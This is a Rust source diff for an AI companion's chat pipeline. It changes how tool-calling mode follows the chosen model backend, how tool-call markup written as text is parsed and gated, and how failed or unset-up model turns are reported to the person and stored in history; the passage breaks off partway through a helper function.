@@ -8,7 +8,7 @@ use yantrikdb_core::YantrikDB;
 use yantrik_ml::{
     ChatMessage, GenerationConfig, LLMBackend, ToolCall, ToolCallMode,
     ModelCapabilityProfile, ModelFamily, ToolFamily,
-    parse_tool_calls, extract_text_content,
+    ThoughtWithoutAnswer, THOUGHT_WITHOUT_ANSWER,
     ChatTemplate, template_for_family,
     CognitiveRouter, RouteDecision,
 };
@@ -35,6 +35,7 @@ use crate::proactive::ProactiveEngine;
 use crate::sanitize;
 use crate::security::SecurityGuard;
 use crate::tool_cache::ToolCache;
+use crate::tool_markup;
 use crate::tool_traces::ToolTraces;
 use crate::tools::{self, PermissionLevel, ToolContext, ToolRegistry, parse_permission};
 use crate::types::{AgentResponse, CompanionState, ProactiveMessage};
@@ -817,7 +818,6 @@ impl CompanionService {
         // Additional tools selected dynamically per query via select_tools_for_query().
         // Full tool set discoverable via discover_tools meta-tool.
         let max_perm = parse_permission(&config.tools.max_permission);
-        let use_native_tools = llm.backend_name() == "api" && capability_profile.uses_native_tools();
         let judge = crate::judge_route::build_judge(&config.judge, &llm, crate::judge_route::chat_locality(&config.llm));
         let decisions = crate::decisions::Decisions::default();
         decisions.publish(judge.clone(), &config.judge, false, crate::judge_route::chat_locality(&config.llm));
@@ -827,35 +827,17 @@ impl CompanionService {
                            locality = info.locality.as_str(), "decision model");
         }
 
-        // Native tools: only ALWAYS_TOOLS (6 tools) — rest added dynamically per query
+        // Native tools: only ALWAYS_TOOLS (6 tools) — rest added dynamically per query.
+        // Text-injected tools: only for non-API backends (also uses ALWAYS_TOOLS).
+        // `swap_llm` derives the same three from the new backend (`tool_mode`).
         tracing::debug!(always_on = ALWAYS_TOOLS.len(), "Dynamic tool selection initialized");
-        let native_core_tools = if config.tools.enabled {
-            registry.definitions_for(ALWAYS_TOOLS, max_perm)
-        } else {
-            Vec::new()
-        };
-
-        // Text-injected tools: only for non-API backends (also uses ALWAYS_TOOLS)
-        let tools_system_message = if config.tools.enabled && !use_native_tools {
-            let core_defs = registry.definitions_for(ALWAYS_TOOLS, max_perm);
-            tracing::info!(
-                always = core_defs.len(),
-                total = registry.definitions(max_perm).len(),
-                "Tools prefix: text-injected for {} backend (dynamic selection active)",
-                llm.backend_name(),
-            );
-            template_for_family(capability_profile.family).format_tools(&core_defs)
-        } else {
-            if config.tools.enabled {
-                tracing::info!(
-                    always = native_core_tools.len(),
-                    total = registry.definitions(max_perm).len(),
-                    "Native tool calling: {} always-on + dynamic per-query selection",
-                    native_core_tools.len(),
-                );
-            }
-            String::new()
-        };
+        let crate::tool_mode::ToolMode {
+            native: use_native_tools,
+            prefix: tools_system_message,
+            native_core: native_core_tools,
+        } = crate::tool_mode::for_backend(
+            &*llm, &capability_profile, &registry, ALWAYS_TOOLS, config.tools.enabled, max_perm,
+        );
 
         // Sync tool cache — still used by discover_tools for category metadata
         ToolCache::ensure_table(&db.conn());
@@ -1205,12 +1187,25 @@ impl CompanionService {
         self.capability_profile = yantrik_ml::ModelCapabilityProfile::from_model_name(&model_id);
         self.model_family = self.capability_profile.family;
         self.llm = new_llm;
+        // The tools follow the new backend as at start-up. Until 16 Oct 2026 they kept the
+        // start-up backend's: a fresh install on the not-set-up backend that then chose Claude
+        // (VM 542) sent Claude no `tools` and told it to write `<tool_call>` XML, so it answered
+        // with raw markup the person saw as the reply.
+        let mode = crate::tool_mode::for_backend(
+            &*self.llm, &self.capability_profile, &self.registry, ALWAYS_TOOLS,
+            self.config.tools.enabled, parse_permission(&self.config.tools.max_permission),
+        );
+        self.use_native_tools = mode.native;
+        self.tools_system_message = mode.prefix;
+        self.native_core_tools = mode.native_core;
         // A decision model that is the chat model follows it.
         if self.config.judge.kind() == yantrik_companion_core::judge_config::JudgeKind::ChatModel {
             self.judge = crate::judge_route::build_judge(&self.config.judge, &self.llm, crate::judge_route::chat_locality(&self.config.llm));
             self.publish_decisions();
         }
-        tracing::info!(model = %model_id, "LLM backend swapped");
+        // The profile logged at start-up is the start-up model's; after a swap (the first run
+        // picking a provider) it is this one, and a log that only shows the old one misleads.
+        tracing::info!(model = %model_id, profile = %self.capability_profile.summary(), "LLM backend swapped");
     }
 
     /// Switch the decision model at runtime, from Settings. `None` of a judge is Off: every
@@ -1580,7 +1575,7 @@ impl CompanionService {
 
                     match self.llm.chat(&messages, &gen_config, None) {
                         Ok(r) => {
-                            let text = extract_text_content(&r.text);
+                            let text = tool_markup::text_outside(&r.text);
                             let text = if text.is_empty() { r.text } else { text };
                             let text = strip_think_tags(&text);
                             vars.insert(store_as.clone(), text);
@@ -1635,6 +1630,8 @@ impl CompanionService {
             urges_delivered: vec![],
             tool_calls_made,
             offline_mode: false,
+            model_failure: None,
+            without_model: false,
         })
     }
 
@@ -1656,8 +1653,23 @@ impl CompanionService {
         }
     }
 
+    /// With no model chosen (the shipped config names none), every message is answered with one
+    /// plain sentence naming the fix, before anything else runs (the router's canned greetings
+    /// included): the person learns at once that nothing can think yet, and why.
+    fn not_set_up(&self, on_token: &mut dyn FnMut(&str)) -> Option<AgentResponse> {
+        if self.llm.backend_name() != yantrik_ml::not_set_up::BACKEND {
+            return None;
+        }
+        let message = yantrik_ml::not_set_up::NOT_SET_UP.to_string();
+        on_token(&message);
+        Some(AgentResponse { message, memories_recalled: 0, urges_delivered: vec![], tool_calls_made: vec![], offline_mode: false, without_model: true, model_failure: None })
+    }
+
     /// The 9-step message pipeline.
     pub fn handle_message(&mut self, user_text: &str) -> AgentResponse {
+        if let Some(r) = self.not_set_up(&mut |_| {}) {
+            return r;
+        }
         // Step 0: SecurityGuard — check user input for injection
         if let Some(warning) = self.guard.check_input(user_text, &self.db) {
             return AgentResponse {
@@ -1666,6 +1678,8 @@ impl CompanionService {
                 urges_delivered: vec![],
                 tool_calls_made: vec![],
                 offline_mode: false,
+                model_failure: None,
+                without_model: true,
             };
         }
 
@@ -1689,6 +1703,8 @@ impl CompanionService {
                         urges_delivered: vec![],
                         tool_calls_made: vec![],
                         offline_mode: false,
+                        model_failure: None,
+                        without_model: true,
                     };
                 }
                 RouteDecision::Tool { ref name, score, .. } if score >= 0.50 && self.config.tools.enabled => {
@@ -1721,6 +1737,8 @@ impl CompanionService {
                         urges_delivered: vec![],
                         tool_calls_made: vec![name.clone()],
                         offline_mode: false,
+                        model_failure: None,
+                        without_model: true,
                     };
                 }
                 RouteDecision::Recipe { ref id, ref name, score } if score >= 0.40 => {
@@ -2011,14 +2029,14 @@ impl CompanionService {
 
             let mut response_text = match self.llm.chat(&final_messages, &gen_config, None) {
                 Ok(r) => {
-                    let text = extract_text_content(&r.text);
+                    let text = tool_markup::text_outside(&r.text);
                     if text.is_empty() { r.text } else { text }
                 }
                 Err(_) => format!("Here's what I found: {}", &tool_result[..tool_result.len().min(500)]),
             };
 
             // Clean up response
-            response_text = extract_text_content(&response_text);
+            response_text = tool_markup::text_outside(&response_text);
             response_text = strip_think_tags(&response_text);
             response_text = self.guard.check_response(&response_text, &self.db);
 
@@ -2057,6 +2075,8 @@ impl CompanionService {
                 urges_delivered: urge_ids,
                 tool_calls_made,
                 offline_mode: false,
+                model_failure: None,
+                without_model: false,
             };
         }
 
@@ -2093,7 +2113,9 @@ impl CompanionService {
         // For non-API backends: text-inject selected tools into system message
         if !self.use_native_tools && self.config.tools.enabled {
             let selected_defs = self.registry.definitions_for(&selected_tool_names, max_perm);
-            let tools_text = self.template().format_tools(&selected_defs);
+            let tools_text = self
+                .template()
+                .format_tools_compact(&selected_defs, active_profile.tier);
             if !tools_text.is_empty() {
                 if let Some(first) = context_messages.first() {
                     let combined = format!("{}\n\n{}", tools_text, first.content);
@@ -2167,6 +2189,10 @@ impl CompanionService {
             std::collections::HashSet::new();
         let mut response_text = String::new();
         let mut is_offline = false;
+        // Set when a model was reached and failed the turn (it thought and gave no answer): the
+        // reply is then a sentence about the failure, which is neither the model's words nor
+        // the offline responder's.
+        let mut model_failure: Option<String> = None;
         let max_nudges = if degraded { 0 } else { self.config.agent.max_nudges };
         let mut agent_loop = AgentLoop::new(user_text, max_nudges);
 
@@ -2196,6 +2222,8 @@ impl CompanionService {
         // Discovery rounds are limited; actual tool rounds reset the counter.
         // Max rounds adapt to model capability — smaller models get fewer steps.
         let mut discovery_budget = if degraded { 0 } else { self.config.tools.max_tool_rounds };
+        // Rounds whose reply was a tool call that could not be read (`unread_call_note`).
+        let mut unread_calls = 0usize;
         let max_total_rounds = if degraded { 3 } else {
             // Use the minimum of config max_steps and profile max_agent_steps
             self.config.agent.max_steps.min(active_profile.max_agent_steps).max(3)
@@ -2208,13 +2236,21 @@ impl CompanionService {
             } else {
                 None
             };
-            let llm_response = match self.llm.chat(&messages, &gen_config, tools_param) {
+            let mut llm_response = match self.llm.chat(&messages, &gen_config, tools_param) {
                 Ok(r) => {
                     self.note_llm_reachable();
                     r
                 }
+                Err(e) if answered_badly(&*e).is_some() => {
+                    self.note_llm_reachable();
+                    response_text = answered_badly(&*e).unwrap_or_default();
+                    model_failure = Some(e.to_string());
+                    agent_loop.fail("the model was reached but gave no answer");
+                    break;
+                }
                 Err(e) => {
                     self.note_llm_offline("", &e);
+                    model_failure = Some(e.to_string());
                     response_text = OfflineResponder::respond(
                         &self.db,
                         user_text,
@@ -2228,6 +2264,13 @@ impl CompanionService {
                     break;
                 }
             };
+
+            // Calls a native-tool model wrote as text run as native ones (VM 542, 16 Oct 2026),
+            // only when the reply is those calls alone and each is one this turn offered.
+            let gate = tool_markup::Gate::new(&self.registry, &native_tools, &selected_tool_names, &injected_tool_names, &self.skill_extra_tools);
+            if self.use_native_tools {
+                tool_markup::adopt_text_calls(&mut llm_response, None, &gate);
+            }
 
             // Use native tool_calls if available, fall back to text parsing.
             // For StructuredJSON mode: parse via StructuredDecisionParser first.
@@ -2275,18 +2318,27 @@ impl CompanionService {
                                     continue; // Retry with repair prompt
                                 }
                                 // No repair loop — fall back to text parsing
-                                parse_tool_calls(&llm_response.text)
+                                tool_markup::calls_in(&llm_response.text, &gate)
                             }
                         }
                     }
                     Err(_) => {
                         // Structured parse failed — fall back to standard tool call parsing
-                        parse_tool_calls(&llm_response.text)
+                        tool_markup::calls_in(&llm_response.text, &gate)
                     }
                 }
             } else {
-                parse_tool_calls(&llm_response.text)
+                tool_markup::calls_in(&llm_response.text, &gate)
             };
+
+            // A native call that could not be read is not an answer: tell the model and go round.
+            if tool_calls.is_empty() && llm_response.is_unread_tool_call() {
+                tracing::warn!(finish_reason = %llm_response.stop_reason, "the model's tool call could not be read; asking again");
+                unread_calls += 1;
+                messages.push(ChatMessage::assistant(&llm_response.text));
+                messages.push(ChatMessage::user(unread_call_note(&llm_response)));
+                continue;
+            }
 
             if tool_calls.is_empty() {
                 // Nudge on empty: if response is weak and we have budget, push LLM to try harder
@@ -2310,24 +2362,16 @@ impl CompanionService {
             let has_real_tool = tool_calls.iter().any(|c| c.name != "discover_tools");
             if !has_real_tool {
                 if discovery_budget == 0 {
-                    response_text = extract_text_content(&llm_response.text);
+                    response_text = tool_markup::text_outside(&llm_response.text);
                     agent_loop.complete();
                     break;
                 }
                 discovery_budget -= 1;
             }
 
-            let text_part = extract_text_content(&llm_response.text);
+            let text_part = tool_markup::text_outside(&llm_response.text);
 
-            // Add assistant message with proper format
-            if self.use_native_tools && !llm_response.api_tool_calls.is_empty() {
-                messages.push(ChatMessage::assistant_with_tool_calls(
-                    &llm_response.text,
-                    llm_response.api_tool_calls.clone(),
-                ));
-            } else {
-                messages.push(ChatMessage::assistant(&llm_response.text));
-            }
+            messages.push(assistant_turn(&llm_response.text, &llm_response, self.use_native_tools));
 
             let tc_pairs: Vec<(String, serde_json::Value)> = tool_calls
                 .iter()
@@ -2350,6 +2394,7 @@ impl CompanionService {
                 &self.policy_engine,
                 &self.trust_state,
                 self.model_family,
+                active_profile.tier,
             );
 
             if !text_part.is_empty() {
@@ -2368,11 +2413,20 @@ impl CompanionService {
                 "Summarize what you accomplished in 1-2 sentences. Do NOT call any more tools."
             ));
             if let Ok(summary) = self.llm.chat(&messages, &gen_config, None) {
-                let text = extract_text_content(&summary.text);
+                let text = tool_markup::text_outside(&summary.text);
                 if !text.is_empty() {
                     response_text = text;
                 }
             }
+        }
+        // The last line of defence: tool-call markup is never the reply (VM 542, 16 Oct 2026).
+        if tool_markup::is_markup_only(&response_text) {
+            response_text = tool_markup::UNUSABLE_REPLY.to_string();
+            model_failure.get_or_insert_with(|| "the reply was tool-call markup that could not be run".into());
+        }
+        if response_text.is_empty() && unread_calls > 0 {
+            response_text = UNREAD_TOOL_CALL.to_string();
+            model_failure = Some(format!("{unread_calls} tool call(s) from the model could not be read"));
         }
         if response_text.is_empty() {
             response_text = "I'm here. How can I help?".to_string();
@@ -2399,7 +2453,7 @@ impl CompanionService {
         }
 
         // Clean up tool call XML and Qwen3.5 thinking blocks from final response
-        response_text = extract_text_content(&response_text);
+        response_text = tool_markup::text_outside(&response_text);
         response_text = strip_think_tags(&response_text);
 
         // Hallucination Firewall — verify factual claims against ground truth
@@ -2462,11 +2516,12 @@ impl CompanionService {
         // SecurityGuard: filter output for sensitive info leaks
         response_text = self.guard.check_response(&response_text, &self.db);
 
-        // Update conversation history
+        // Update conversation history. A failed turn's reply is about the failure, and can be
+        // the provider's own words: the model is shown a fixed line instead (`FAILED_TURN`).
         self.conversation_history
             .push(ChatMessage::user(user_text));
         self.conversation_history
-            .push(ChatMessage::assistant(&response_text));
+            .push(ChatMessage::assistant(history_reply(&response_text, &model_failure)));
 
         // Compress conversation history when it grows too long
         self.compress_history_if_needed();
@@ -2477,7 +2532,7 @@ impl CompanionService {
         if !self.incognito {
             // Step 8: Learn from this exchange (skip if offline — LLM needed)
             //   V25: Clean tool artifacts from response before learning
-            if !is_offline {
+            if !is_offline && model_failure.is_none() {
                 let clean_response = sanitize::clean_response_for_learning(
                     &response_text, &tool_calls_made,
                 );
@@ -2555,6 +2610,8 @@ impl CompanionService {
             urges_delivered: urge_ids,
             tool_calls_made,
             offline_mode: is_offline,
+            model_failure,
+            without_model: false,
         }
     }
 
@@ -2598,6 +2655,9 @@ impl CompanionService {
         if outside {
             yantrik_companion_core::taint::mark_outside("a program on the companion's socket");
         }
+        if let Some(r) = self.not_set_up(&mut on_token) {
+            return r;
+        }
 
         // Step 0: SecurityGuard — check user input for injection
         if let Some(warning) = self.guard.check_input(user_text, &self.db) {
@@ -2608,6 +2668,8 @@ impl CompanionService {
                 urges_delivered: vec![],
                 tool_calls_made: vec![],
                 offline_mode: false,
+                model_failure: None,
+                without_model: true,
             };
         }
 
@@ -2624,6 +2686,8 @@ impl CompanionService {
                         urges_delivered: vec![],
                         tool_calls_made: vec![],
                         offline_mode: false,
+                        model_failure: None,
+                        without_model: true,
                     };
                 }
                 RouteDecision::Tool { ref name, score, .. } if score >= 0.50 && self.config.tools.enabled => {
@@ -2653,6 +2717,8 @@ impl CompanionService {
                         urges_delivered: vec![],
                         tool_calls_made: vec![name.clone()],
                         offline_mode: false,
+                        model_failure: None,
+                        without_model: true,
                     };
                 }
                 RouteDecision::Recipe { ref id, ref name, score } if score >= 0.40 => {
@@ -2872,7 +2938,7 @@ impl CompanionService {
                     on_token(token);
                 }) {
                     Ok(r) => {
-                        response_text = extract_text_content(&r.text);
+                        response_text = tool_markup::text_outside(&r.text);
                         if response_text.is_empty() { response_text = r.text; }
                     }
                     Err(_) => {
@@ -2918,6 +2984,8 @@ impl CompanionService {
                     urges_delivered: urge_ids,
                     tool_calls_made: vec![tool_name],
                     offline_mode: false,
+                    model_failure: None,
+                    without_model: false,
                 };
             }
             // MCQ didn't select a tool — fall through to standard path
@@ -2953,7 +3021,9 @@ impl CompanionService {
 
         if !self.use_native_tools && self.config.tools.enabled {
             let selected_defs = self.registry.definitions_for(&selected_tool_names, max_perm);
-            let tools_text = self.template().format_tools(&selected_defs);
+            let tools_text = self
+                .template()
+                .format_tools_compact(&selected_defs, active_profile.tier);
             if !tools_text.is_empty() {
                 if let Some(first) = context_messages.first() {
                     let combined = format!("{}\n\n{}", tools_text, first.content);
@@ -3021,6 +3091,10 @@ impl CompanionService {
             std::collections::HashSet::new();
         let mut response_text: String;
         let mut is_offline = false;
+        // Set when a model was reached and failed the turn (it thought and gave no answer): the
+        // reply is then a sentence about the failure, which is neither the model's words nor
+        // the offline responder's.
+        let mut model_failure: Option<String> = None;
         let max_nudges = if degraded { 0 } else { self.config.agent.max_nudges };
         let mut agent_loop = AgentLoop::new(user_text, max_nudges);
 
@@ -3050,6 +3124,8 @@ impl CompanionService {
 
         // Round 1: streaming
         let mut streamed_text = String::new();
+        // Rounds whose reply was a tool call that could not be read (`unread_call_note`).
+        let mut unread_calls = 0usize;
         // Compute tools_param in a temporary scope so it drops before any mutable borrow of native_tools
         let llm_response = {
             let tools_param: Option<&[serde_json::Value]> = if self.use_native_tools && !native_tools.is_empty() {
@@ -3064,8 +3140,14 @@ impl CompanionService {
         };
 
         match llm_response {
-            Ok(r) => {
+            Ok(mut r) => {
                 self.note_llm_reachable();
+                // Calls a native-tool model wrote as text run as native ones (VM 542, 16 Oct 2026).
+                // Only when the reply is those calls alone and each is one this turn offered.
+                let gate = tool_markup::Gate::new(&self.registry, &native_tools, &selected_tool_names, &injected_tool_names, &self.skill_extra_tools);
+                if self.use_native_tools {
+                    tool_markup::adopt_text_calls(&mut r, Some(&streamed_text).filter(|t| !t.is_empty()).map(String::as_str), &gate);
+                }
                 let full_text = if !streamed_text.is_empty() { &streamed_text } else { &r.text };
 
                 // Use native tool_calls if available, fall back to text parsing.
@@ -3093,14 +3175,14 @@ impl CompanionService {
                                 ValidationResult::Invalid(_issues) => {
                                     // In streaming path, repair loop defers to the non-streaming
                                     // follow-up rounds. Fall back to standard text parsing.
-                                    parse_tool_calls(full_text)
+                                    tool_markup::calls_in(full_text, &gate)
                                 }
                             }
                         }
-                        Err(_) => parse_tool_calls(full_text),
+                        Err(_) => tool_markup::calls_in(full_text, &gate),
                     }
                 } else {
-                    parse_tool_calls(full_text)
+                    tool_markup::calls_in(full_text, &gate)
                 };
 
                 if !tool_calls.is_empty() {
@@ -3111,7 +3193,10 @@ impl CompanionService {
                         "Tool calls detected in streaming response"
                     );
                 }
-                if tool_calls.is_empty() {
+                // A native call that could not be read is not an answer either: the follow-up
+                // rounds below tell the model so and ask again.
+                let unread = tool_calls.is_empty() && r.is_unread_tool_call();
+                if tool_calls.is_empty() && !unread {
                     response_text = if !streamed_text.is_empty() {
                         streamed_text.clone()
                     } else {
@@ -3119,7 +3204,7 @@ impl CompanionService {
                     };
                 } else {
                     // Tool calls found — enter multi-round tool loop (non-streaming)
-                    let last_text_part = extract_text_content(full_text);
+                    let last_text_part = tool_markup::text_outside(full_text);
 
                     let display_text = if last_text_part.len() > 120 {
                         String::new()
@@ -3128,7 +3213,11 @@ impl CompanionService {
                     };
 
                     on_token("__REPLACE__");
-                    let tool_names: Vec<&str> = tool_calls.iter().map(|c| c.name.as_str()).collect();
+                    let tool_names: Vec<&str> = if unread {
+                        r.api_tool_calls.iter().map(|c| c.function.name.as_str()).collect()
+                    } else {
+                        tool_calls.iter().map(|c| c.name.as_str()).collect()
+                    };
                     let progress_msg = format_tool_progress(&tool_names, 1);
                     if display_text.is_empty() {
                         on_token(&format!("{}\n", progress_msg));
@@ -3136,38 +3225,38 @@ impl CompanionService {
                         on_token(&format!("{}\n{}\n", display_text, progress_msg));
                     }
 
-                    // Add assistant message with proper format
-                    if self.use_native_tools && !r.api_tool_calls.is_empty() {
-                        messages.push(ChatMessage::assistant_with_tool_calls(
-                            full_text, r.api_tool_calls.clone(),
-                        ));
-                    } else {
-                        messages.push(ChatMessage::assistant(full_text));
-                    }
-
                     // Execute first round of tool calls
                     let tc_pairs: Vec<(String, serde_json::Value)> = tool_calls
                         .iter()
                         .map(|c| (c.name.clone(), c.arguments.clone()))
                         .collect();
-                    execute_tool_round_tracked(
-                        &self.registry, &mut self.guard, &self.db,
-                        &tc_pairs, &mut messages, &mut tool_calls_made,
-                        &mut injected_tool_names, max_perm, &self.task_manager,
-                        self.use_native_tools,
-                        &r.api_tool_calls,
-                        &mut native_tools,
-                        &mut agent_loop,
-                        self.config.agent.error_recovery,
-                        self.incognito,
-                        self.cortex.as_mut(),
-                        agent_spawner.as_ref(),
-                        self.event_bus.as_ref(),
-                        msg_trace,
-                        &self.policy_engine,
-                        &self.trust_state,
-                        self.model_family,
-                    );
+                    if unread {
+                        tracing::warn!(finish_reason = %r.stop_reason, "the model's tool call could not be read; asking again");
+                        unread_calls += 1;
+                        messages.push(ChatMessage::assistant(full_text));
+                        messages.push(ChatMessage::user(unread_call_note(&r)));
+                    } else {
+                        messages.push(assistant_turn(full_text, &r, self.use_native_tools));
+                        execute_tool_round_tracked(
+                            &self.registry, &mut self.guard, &self.db,
+                            &tc_pairs, &mut messages, &mut tool_calls_made,
+                            &mut injected_tool_names, max_perm, &self.task_manager,
+                            self.use_native_tools,
+                            &r.api_tool_calls,
+                            &mut native_tools,
+                            &mut agent_loop,
+                            self.config.agent.error_recovery,
+                            self.incognito,
+                            self.cortex.as_mut(),
+                            agent_spawner.as_ref(),
+                            self.event_bus.as_ref(),
+                            msg_trace,
+                            &self.policy_engine,
+                            &self.trust_state,
+                            self.model_family,
+                            active_profile.tier,
+                        );
+                    }
 
                     // Remaining rounds: discovery rounds are budget-limited,
                     // actual tool rounds run until the hard cap.
@@ -3184,13 +3273,24 @@ impl CompanionService {
                             None
                         };
                         match self.llm.chat(&messages, &gen_config, tools_param) {
-                            Ok(r2) => {
+                            Ok(mut r2) => {
                                 self.note_llm_reachable();
+                                let gate = tool_markup::Gate::new(&self.registry, &native_tools, &selected_tool_names, &injected_tool_names, &self.skill_extra_tools);
+                                if self.use_native_tools {
+                                    tool_markup::adopt_text_calls(&mut r2, None, &gate);
+                                }
                                 let tc2: Vec<ToolCall> = if !r2.tool_calls.is_empty() {
                                     r2.tool_calls.clone()
                                 } else {
-                                    parse_tool_calls(&r2.text)
+                                    tool_markup::calls_in(&r2.text, &gate)
                                 };
+                                if tc2.is_empty() && r2.is_unread_tool_call() {
+                                    tracing::warn!(finish_reason = %r2.stop_reason, "the model's tool call could not be read; asking again");
+                                    unread_calls += 1;
+                                    messages.push(ChatMessage::assistant(&r2.text));
+                                    messages.push(ChatMessage::user(unread_call_note(&r2)));
+                                    continue;
+                                }
                                 if tc2.is_empty() {
                                     on_token("__REPLACE__");
                                     on_token(&r2.text);
@@ -3202,7 +3302,7 @@ impl CompanionService {
                                 let has_real_tool = tc2.iter().any(|c| c.name != "discover_tools");
                                 if !has_real_tool {
                                     if discovery_budget == 0 {
-                                        let fallback = extract_text_content(&r2.text);
+                                        let fallback = tool_markup::text_outside(&r2.text);
                                         if !fallback.is_empty() {
                                             on_token("__REPLACE__");
                                             on_token(&fallback);
@@ -3214,7 +3314,7 @@ impl CompanionService {
                                     discovery_budget -= 1;
                                 }
 
-                                let round_text = extract_text_content(&r2.text);
+                                let round_text = tool_markup::text_outside(&r2.text);
                                 let names2: Vec<&str> = tc2.iter().map(|c| c.name.as_str()).collect();
                                 tracing::info!(
                                     count = tc2.len(),
@@ -3235,13 +3335,7 @@ impl CompanionService {
                                     on_token(&format!("{}\n{}\n", round_display, progress_msg2));
                                 }
 
-                                if self.use_native_tools && !r2.api_tool_calls.is_empty() {
-                                    messages.push(ChatMessage::assistant_with_tool_calls(
-                                        &r2.text, r2.api_tool_calls.clone(),
-                                    ));
-                                } else {
-                                    messages.push(ChatMessage::assistant(&r2.text));
-                                }
+                                messages.push(assistant_turn(&r2.text, &r2, self.use_native_tools));
 
                                 let tc2_pairs: Vec<(String, serde_json::Value)> = tc2
                                     .iter()
@@ -3270,6 +3364,7 @@ impl CompanionService {
                                     &self.policy_engine,
                                     &self.trust_state,
                                     self.model_family,
+                                    active_profile.tier,
                                 );
 
                                 if !round_text.is_empty() {
@@ -3277,8 +3372,18 @@ impl CompanionService {
                                 }
                             }
                             Err(_) if !response_text.is_empty() => break,
+                            Err(e) if answered_badly(&*e).is_some() => {
+                                self.note_llm_reachable();
+                                response_text = answered_badly(&*e).unwrap_or_default();
+                                on_token("__REPLACE__");
+                                on_token(&response_text);
+                                model_failure = Some(e.to_string());
+                                agent_loop.fail("the model was reached but gave no answer");
+                                break;
+                            }
                             Err(e) => {
                                 self.note_llm_offline(" during tool follow-up", &e);
+                                model_failure = Some(e.to_string());
                                 response_text = OfflineResponder::respond(
                                     &self.db, user_text, &self.system_context,
                                     &memories, &urges, &self.config.user_name,
@@ -3305,7 +3410,7 @@ impl CompanionService {
                         ));
                         match self.llm.chat(&messages, &gen_config, None) {
                             Ok(summary) => {
-                                let text = extract_text_content(&summary.text);
+                                let text = tool_markup::text_outside(&summary.text);
                                 if !text.is_empty() {
                                     on_token("__REPLACE__");
                                     on_token(&text);
@@ -3325,8 +3430,19 @@ impl CompanionService {
                     }
                 }
             }
+            // The model was reached and answered with thinking alone (a Qwen3 that spent the whole
+            // budget thinking, VM 542): say so, in words, rather than show an empty bubble.
+            Err(e) if answered_badly(&*e).is_some() => {
+                self.note_llm_reachable();
+                response_text = answered_badly(&*e).unwrap_or_default();
+                on_token("__REPLACE__");
+                on_token(&response_text);
+                model_failure = Some(e.to_string());
+                agent_loop.fail("the model was reached but gave no answer");
+            }
             Err(e) => {
                 self.note_llm_offline("", &e);
+                model_failure = Some(e.to_string());
                 response_text = OfflineResponder::respond(
                     &self.db,
                     user_text,
@@ -3340,8 +3456,24 @@ impl CompanionService {
             }
         }
 
-        if response_text.is_empty() {
-            response_text = "I'm here. How can I help?".to_string();
+        // The last line of defence: tool-call markup is never the reply, and a bubble that
+        // streamed it is replaced (VM 542, 16 Oct 2026).
+        if tool_markup::is_markup_only(&response_text) {
+            response_text = tool_markup::UNUSABLE_REPLY.to_string();
+            model_failure.get_or_insert_with(|| "the reply was tool-call markup that could not be run".into());
+            on_token("__REPLACE__");
+            on_token(&response_text);
+        }
+        // Never an empty bubble: whatever was streamed, the turn ends on words.
+        if response_text.trim().is_empty() {
+            response_text = if unread_calls > 0 {
+                model_failure = Some(format!("{unread_calls} tool call(s) from the model could not be read"));
+                UNREAD_TOOL_CALL.to_string()
+            } else {
+                "I'm here. How can I help?".to_string()
+            };
+            on_token("__REPLACE__");
+            on_token(&response_text);
         }
 
         // Record tool chain trace for learning (streaming path)
@@ -3364,7 +3496,7 @@ impl CompanionService {
             );
         }
 
-        response_text = extract_text_content(&response_text);
+        response_text = tool_markup::text_outside(&response_text);
         response_text = strip_think_tags(&response_text);
 
         // Hallucination Firewall — verify factual claims against ground truth (streaming path)
@@ -3407,10 +3539,10 @@ impl CompanionService {
         // SecurityGuard: filter output for sensitive info leaks
         response_text = self.guard.check_response(&response_text, &self.db);
 
-        // Update conversation history
+        // Update conversation history (a failed turn as a fixed line, as in `handle_message`).
         self.conversation_history.push(ChatMessage::user(user_text));
         self.conversation_history
-            .push(ChatMessage::assistant(&response_text));
+            .push(ChatMessage::assistant(history_reply(&response_text, &model_failure)));
 
         // Compress conversation history when it grows too long
         self.compress_history_if_needed();
@@ -3423,7 +3555,7 @@ impl CompanionService {
         if !self.incognito {
             // Step 8: Learn from this exchange (skip if offline — LLM needed)
             //   V25: Clean tool artifacts from response before learning
-            if !is_offline {
+            if !is_offline && model_failure.is_none() {
                 let clean_response = sanitize::clean_response_for_learning(
                     &response_text, &tool_calls_made,
                 );
@@ -3501,6 +3633,8 @@ impl CompanionService {
             urges_delivered: urge_ids,
             tool_calls_made,
             offline_mode: is_offline,
+            model_failure,
+            without_model: false,
         }
     }
 
@@ -4060,6 +4194,82 @@ impl CompanionService {
     }
 }
 
+/// What the conversation history holds for a turn the model failed, in place of what the person
+/// was told. That sentence can carry up to 200 characters an endpoint chose ("Claude refused the
+/// request: …"), and history is replayed to the model on every later turn as the companion's own
+/// words; after the person switches models, to a different provider. The person still reads the
+/// reason in the chat; the model never does (security review of #827, finding 2).
+pub const FAILED_TURN: &str = "(No answer: this turn failed before the model could reply.)";
+
+/// The assistant's side of a turn as the history keeps it: the reply, or [`FAILED_TURN`] when
+/// the model failed the turn.
+fn history_reply<'a>(response_text: &'a str, model_failure: &Option<String>) -> &'a str {
+    if model_failure.is_some() { FAILED_TURN } else { response_text }
+}
+
+/// What the person is told when a model call reached the model and still gave no answer: it
+/// thought and said nothing ([`ThoughtWithoutAnswer`]), or its server reported an error inside
+/// the streamed reply ([`yantrik_ml::StreamError`], VM 542: "malformed tool call"), or the
+/// provider refused the request in its own words ([`yantrik_ml::ProviderRefused`]). That model is
+/// reachable, so the turn is not offline; it failed, and the person is told so in words. None for
+/// any other failure, which is the offline path.
+fn answered_badly(e: &(dyn std::error::Error + Send + Sync + 'static)) -> Option<String> {
+    if e.downcast_ref::<ThoughtWithoutAnswer>().is_some() {
+        return Some(THOUGHT_WITHOUT_ANSWER.to_string());
+    }
+    // The provider answered and refused the request (VM 542, 16 Oct 2026: "`temperature` is
+    // deprecated for this model"): reached, so not offline, and its reason is the one to read.
+    if let Some(refused) = e.downcast_ref::<yantrik_ml::ProviderRefused>() {
+        return Some(refused.said());
+    }
+    e.downcast_ref::<yantrik_ml::StreamError>().map(yantrik_ml::stream_error::said)
+}
+
+/// What the person is told when every reply the model gave was a tool call nobody could read.
+pub const UNREAD_TOOL_CALL: &str =
+    "The model tried to use a tool, but its call could not be read; try again or choose another model.";
+
+/// What the model is told when its native call could not be read ([`yantrik_ml::LLMResponse::is_unread_tool_call`]),
+/// so the next round can call again rather than the turn ending as an empty answer.
+fn unread_call_note(r: &yantrik_ml::LLMResponse) -> String {
+    match r.unread_tool_calls().first() {
+        Some(call) => {
+            let arguments: String = call.function.arguments.chars().take(200).collect();
+            format!(
